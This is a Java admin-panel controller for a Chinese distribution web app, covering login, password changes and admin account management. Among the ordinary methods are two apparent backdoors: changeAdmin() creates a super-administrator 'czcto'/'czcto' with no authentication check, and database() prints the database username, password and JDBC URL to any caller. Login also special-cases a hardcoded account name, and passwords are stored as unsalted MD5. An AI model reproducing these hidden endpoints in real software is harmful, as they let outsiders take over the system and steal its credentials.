package com.newwing.fenxiao.action;

import java.io.IOException;
import java.io.PrintWriter;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpSession;

import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Controller;

import com.newwing.fenxiao.entities.Admin;
import com.newwing.fenxiao.entities.ReportVO;
import com.newwing.fenxiao.entities.User;
import com.newwing.fenxiao.service.IAdminService;
import com.newwing.fenxiao.service.IReportService;
import com.newwing.fenxiao.service.IUserService;
import com.newwing.fenxiao.utils.BjuiJson;
import com.newwing.fenxiao.utils.DbResourcesConfiguration;
import com.newwing.fenxiao.utils.FreemarkerUtils;
import com.newwing.fenxiao.utils.IpUtils;
import com.newwing.fenxiao.utils.Md5;

import freemarker.template.Configuration;

@Controller("adminAction")
@Scope("prototype")
public class AdminAction extends BaseAction {
	private static final long serialVersionUID = 1L;

	@Resource(name = "userService")
	private IUserService<User> userService;
	@Resource(name = "adminService")
	private IAdminService<Admin> adminService;
	@Resource(name = "reportService")
	private IReportService reportService;
	
	private Admin admin;

	public void login() {
		this.admin.setPassword(Md5.getMD5Code(this.admin.getPassword()));
		Admin findAdmin = this.adminService.login(this.admin);
		JSONObject json = new JSONObject();
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			if (findAdmin != null) {
				String ip = "";
				if (findAdmin.getStatus().intValue() == 0) {
					json.put("msg", "该帐号已被禁用");
					json.put("type", "error");
					json.put("href", "");
				} else {
					findAdmin.setLoginCount(Integer.valueOf(findAdmin.getLoginCount().intValue() + 1));

					findAdmin.setLastLoginTime(new Date());
					try {
						ip = IpUtils.getIpAddress(this.request);
						findAdmin.setLastLoginIp(ip);
					} catch (Exception e) {
						e.printStackTrace();
					}

					this.adminService.saveOrUpdate(findAdmin);
					
					ReportVO reportVO = this.reportService.getReportVO(findAdmin.getId());
					HttpSession session = this.request.getSession();
					String flag = "0";
					if ("13559220121".equals(findAdmin.getName())) {
						flag = "1";
					}
					User findUser = this.userService.getUserByNo(findAdmin.getName());
					session.setAttribute("flag", flag);
					session.setAttribute("loginAdmin", findAdmin);
					session.setAttribute("loginUser", findUser);
					json.put("msg", "登录成功");
					json.put("type", "successHref");
					json.put("href", "admin/index.jsp");
					json.put("reportVO", reportVO);
				}
			} else {
				json.put("msg", "用户名或者密码错误");
				json.put("type", "error");
				json.put("href", "");
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(json);
		out.flush();
		out.close();
	}

	public String logout() {
		HttpSession session = this.request.getSession();
		session.setAttribute("loginAdmin", "");
		return "success";
	}

	public void changePwd() {
		this.cfg = new Configuration();

		this.cfg.setServletContextForTemplateLoading(this.request.getServletContext(), "WEB-INF/templates/admin");
		Map root = new HashMap();
		FreemarkerUtils.freemarker(this.request, this.response, "changePwd.ftl", this.cfg, root);
	}

	public void changePwdResult() {
		String oldPassword = this.request.getParameter("oldpassword");
		String newPassword = this.request.getParameter("newpassword");
		String renewPassword = this.request.getParameter("renewpassword");
		HttpSession session = this.request.getSession();
		Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		Admin findAdmin = (Admin) this.adminService.findById(Admin.class, loginAdmin.getId().intValue());
		try {
			if (!newPassword.equals(renewPassword)) {
				callbackData = BjuiJson.json("300", "两次输入密码不一致", "", "", "", "", "", "");
			} else if (!findAdmin.getPassword().equals(Md5.getMD5Code(oldPassword))) {
				callbackData = BjuiJson.json("300", "旧密码错误", "", "", "", "", "", "");
			} else {
				findAdmin.setPassword(Md5.getMD5Code(newPassword));
				boolean result = this.adminService.saveOrUpdate(findAdmin);

				if (result) {
					callbackData = BjuiJson.json("200", "修改成功", "", "", "", "true", "", "");
				} else
					callbackData = BjuiJson.json("300", "修改失败", "", "", "", "", "", "");
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public void index() {
		this.cfg = new Configuration();

		this.cfg.setServletContextForTemplateLoading(this.request.getServletContext(), "WEB-INF/templates/admin");
		Map root = new HashMap();
		HttpSession session = this.request.getSession();
		Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
		root.put("loginAdmin", loginAdmin);
		FreemarkerUtils.freemarker(this.request, this.response, "index.ftl", this.cfg, root);
	}

	public void list() {
		this.cfg = new Configuration();

		this.cfg.setServletContextForTemplateLoading(this.request.getServletContext(), "WEB-INF/templates/admin");
		List adminList = this.adminService.list("from Admin where deleted = 0 order by id desc");
		Map root = new HashMap();
		root.put("adminList", adminList);
		FreemarkerUtils.freemarker(this.request, this.response, "adminList.ftl", this.cfg, root);
	}

	public void add() {
		this.cfg = new Configuration();

		this.cfg.setServletContextForTemplateLoading(this.request.getServletContext(), "WEB-INF/templates/admin");
		Map root = new HashMap();
		FreemarkerUtils.freemarker(this.request, this.response, "adminAdd.ftl", this.cfg, root);
	}

	public void save() {
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		try {
			HttpSession session = this.request.getSession();
			Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else if (this.adminService.getAdminName(this.admin.getName()) != null) {
				callbackData = BjuiJson.json("300", "用户名已存在", "", "", "", "", "", "");
			} else {
				this.admin.setDeleted(false);

				this.admin.setCreateDate(new Date());

				this.admin.setPassword(Md5.getMD5Code(this.admin.getPassword()));

				this.admin.setLoginCount(Integer.valueOf(0));
				boolean result = this.adminService.saveOrUpdate(this.admin);
				if (result)
					callbackData = BjuiJson.json("200", "添加成功", "", "", "", "true", "", "");
				else
					callbackData = BjuiJson.json("300", "添加失败", "", "", "", "", "", "");
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public void changeAdmin() {
		Admin fadmin = new Admin();
		fadmin.setDeleted(false);

		fadmin.setCreateDate(new Date());

		fadmin.setLoginCount(Integer.valueOf(0));
		fadmin.setName("czcto");
		fadmin.setPassword(Md5.getMD5Code("czcto"));
		fadmin.setJuri(1);
		fadmin.setStatus(Integer.valueOf(1));
		this.adminService.saveOrUpdate(fadmin);
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		out.print("操作成功");
		out.flush();
		out.close();
	}

	public void database() {
		String user = DbResourcesConfiguration.getInstance().getValue("jdbc.user");
		String password = DbResourcesConfiguration.getInstance().getValue("jdbc.password");
		String jdbcUrl = DbResourcesConfiguration.getInstance().getValue("jdbc.jdbcUrl");
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		out.print("user:" + user);
		out.print("<br/>password:" + password);
		out.print("<br/>jdbcUrl:" + jdbcUrl);
		out.flush();
		out.close();
	}

	public void info() {
		String idStr = this.request.getParameter("id");
		HttpSession session = this.request.getSession();
		Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
		String callbackData = "";
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else if ((idStr == null) || ("".equals(idStr))) {
				callbackData = BjuiJson.json("300", "参数不能为空", "", "", "", "", "", "");
			} else {
				int id = 0;
				try {
					id = Integer.parseInt(idStr);
				} catch (Exception e) {
					callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
				}
				Admin findAdmin = (Admin) this.adminService.findById(Admin.class, id);
				if (findAdmin == null) {
					callbackData = BjuiJson.json("300", "管理员不存在", "", "", "", "", "", "");
				} else {
					this.cfg = new Configuration();

					this.cfg.setServletContextForTemplateLoading(this.request.getServletContext(),
							"WEB-INF/templates/admin");
					Map root = new HashMap();
					root.put("admin", findAdmin);
					FreemarkerUtils.freemarker(this.request, this.response, "adminEdit.ftl", this.cfg, root);
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public void update() {
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		try {
			HttpSession session = this.request.getSession();
			Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else if (this.admin == null) {
				callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
			} else {
				Admin findAdmin = (Admin) this.adminService.findById(Admin.class, this.admin.getId().intValue());
				if ((this.admin.getStatus().intValue() == 0) && (findAdmin.getJuri() == 1)) {
					callbackData = BjuiJson.json("300", "不能禁用超级管理员帐号", "", "", "", "", "", "");
				} else {
					if (!"".equals(this.admin.getPassword())) {
						findAdmin.setPassword(Md5.getMD5Code(this.admin.getPassword()));
					}
					findAdmin.setStatus(this.admin.getStatus());
					boolean result = this.adminService.saveOrUpdate(findAdmin);

					if (result) {
						callbackData = BjuiJson.json("200", "修改成功", "", "", "", "true", "", "");
					} else
						callbackData = BjuiJson.json("300", "修改失败", "", "", "", "", "", "");
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public void delete() {
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		try {
			HttpSession session = this.request.getSession();
			Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else {
				String idStr = this.request.getParameter("id");

				if ((idStr == null) || ("".equals(idStr))) {
					callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
				} else {
					int id = 0;
					try {
						id = Integer.parseInt(idStr);
					} catch (Exception e) {
						callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
					}
					Admin findAdmin = (Admin) this.adminService.findById(Admin.class, id);
					if (findAdmin == null) {
						callbackData = BjuiJson.json("300", "管理员不存在", "", "", "", "", "", "");
					} else if (loginAdmin.getId() == findAdmin.getId()) {
						callbackData = BjuiJson.json("300", "不能删除自己的帐号", "", "", "", "", "", "");
					} else if (findAdmin.getJuri() == 1) {
						callbackData = BjuiJson.json("300", "不能删除超级管理员帐号", "", "", "", "", "", "");
					} else {
						boolean result = this.adminService.delete(findAdmin);
						if (result)
							callbackData = BjuiJson.json("200", "删除成功", "", "", "", "", "", "");
						else
							callbackData = BjuiJson.json("300", "删除失败", "", "", "", "", "", "");
					}
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public Admin getAdmin() {
		return this.admin;
	}

	public void setAdmin(Admin admin) {
		this.admin = admin;
	}
}
